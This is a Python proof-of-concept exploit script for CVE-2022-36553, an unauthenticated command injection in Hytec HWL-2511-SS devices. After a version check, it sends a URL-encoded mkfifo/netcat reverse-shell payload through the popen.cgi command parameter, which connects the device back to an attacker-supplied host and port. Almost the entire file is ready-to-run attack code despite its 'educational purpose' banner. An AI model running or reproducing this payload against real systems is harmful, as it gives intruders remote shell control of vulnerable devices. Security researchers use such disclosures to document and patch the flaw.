# -*- coding: utf-8 -*-

# Exploit Title: PoPwned command Injection
# Date: 7/26/2022
# Exploit Author: Samy Younsi (https://samy.link)
# Vendor Homepage: https://hytec.co.jp
# Software Link: https://hytec.co.jp/eng/products/our-brand/hwl-2511-ss.html
# Version: 1.05 and under.
# Tested on: HWL-2511-SS version 1.05 (Ubuntu)
# CVE : CVE-2022-36553

from __future__ import print_function, unicode_literals
import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()

def banner():
  hytecLogo = """ 
          ▓▓              ▓▓▓▓▓▓▓▓            ▓▓                          
          ▓▓        ▓▓▓▓▓▓        ▓▓▓▓▓▓      ▓▓                          
          ▒▒    ▒▒▓▓                    ▓▓▒▒  ▓▓                          
          ▓▓  ▒▒          ▒▒▓▓░░░░            ▓▓                     
          ▓▓        ▓▓▓▓▓▓        ▓▓▓▓▓▓      ▓▓                          
          ▓▓      ░░                    ▓▓    ▓▓                          
          ▓▓              ▓▓▓▓▓▓▓▓            ▓▓                          
          ▓▓          ▒▒▓▓        ▓▓▓▓        ▓▓                          
          ▓▓          ░░░░        ░░░░        ▓▓                          
          ▓▓                                  ▓▓                                                
          ▓▓              ▓▓░░░░▓▓            ▓▓                          
          ▓▓                ▒▒▓▓              ▓▓                          
          ▓▓                                  ▓▓  
    ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓                    
  ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓                                
▓▓░░░░░░░░░░░░▓▓░░░░░░░░▒▒░░░░░░░░▓▓░░░░░░░░░░░░░░░░░░░░▓▓                
▓▓░░░░░░░░░░▓▓░░▓▓░░░░▓▓░░▓▓░░░░▓▓░░▓▓░░░░░░░░░░░░░░░░░░▓▓                
▓▓░░░░░░░░░░░░▒▒░░░░░░░░▒▒░░░░░░░░▓▓░░░░░░░░░░░░░░░░░░░░▓▓                
▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░HWL-2511-SS░░░░▓▓                
  ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓                  
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                       
                                                                                 
\033[1;92mSamy Younsi (Necrum Security Labs)\033[1;m         \033[1;91mHWL-2511-SS PING PONG\033[1;m                                                 
                FOR EDUCATIONAL PURPOSE ONLY.   
  """
  return print('\033[1;94m{}\033[1;m'.format(hytecLogo))

def pingWebInterface(RHOST, RPORT):
  url = 'https://{}:{}/cgi-bin/status.cgi?act=status'.format(RHOST, RPORT)
  response = requests.get(url, allow_redirects=False, verify=False, timeout=60)
  
  if response.status_code != 200:
    print('[!] \033[1;91mError: HWL-2511-SS device web interface is not reachable. Make sure the specified IP is correct.\033[1;m')
    exit()
  deviceInfo = json.loads(response.content)
  try:
    if deviceInfo['status']['system']['szSwMobileRouterVersion']:
      version = deviceInfo['status']['system']['szSwMobileRouterVersion']
      if float(version) > 1.05:
        print('[INFO] HWL-2511-SS version {} detected, this device has been patched.'.format(deviceInfo['status']['system']['szSwMobileRouterVersion']))
        exit()
    print('[INFO] HWL-2511-SS version: {}'.format(deviceInfo['status']['system']['szSwMobileRouterVersion']))
  except:
    print('[ERROR] Can\'t grab the device version...')


def execReverseShell(RHOST, RPORT, LHOST, LPORT):
  payload = 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20{}%20{}%20%3E%2Ftmp%2Ff'.format(LHOST, LPORT)
  url = 'https://{}:{}/cgi-bin/popen.cgi?command={}'.format(RHOST, RPORT, payload)
  try:
    print('[INFO] Executing reverse shell...')
    response = requests.get(url, allow_redirects=False, verify=False)
    print("Reverse shell successfully executed. {}:{}".format(LHOST, LPORT))
    return
  except Exception as e:
      print("Reverse shell failed. Make sure the HWL-2511-SS device can reach the host {}:{}").format(LHOST, LPORT)
      return False

def main():
  banner()
  args = parser.parse_args()
  pingWebInterface(args.RHOST, args.RPORT)
  execReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT)


if __name__ == "__main__":
  parser = argparse.ArgumentParser(description='Script PoC that exploit an nauthenticated remote command injection on Hytec Inter HWL-2511-SS devices.', add_help=False)
  parser.add_argument('--RHOST', help="Refers to the IP of the target machine. (HWL-2511-SS device)", type=str, required=True)
  parser.add_argument('--RPORT', help="Refers to the open port of the target machine. (443 by default)", type=int, required=True)
  parser.add_argument('--LHOST', help="Refers to the IP of your machine.", type=str, required=True)
  parser.add_argument('--LPORT', help="Refers to the open port of your machine.", type=int, required=True)
  main()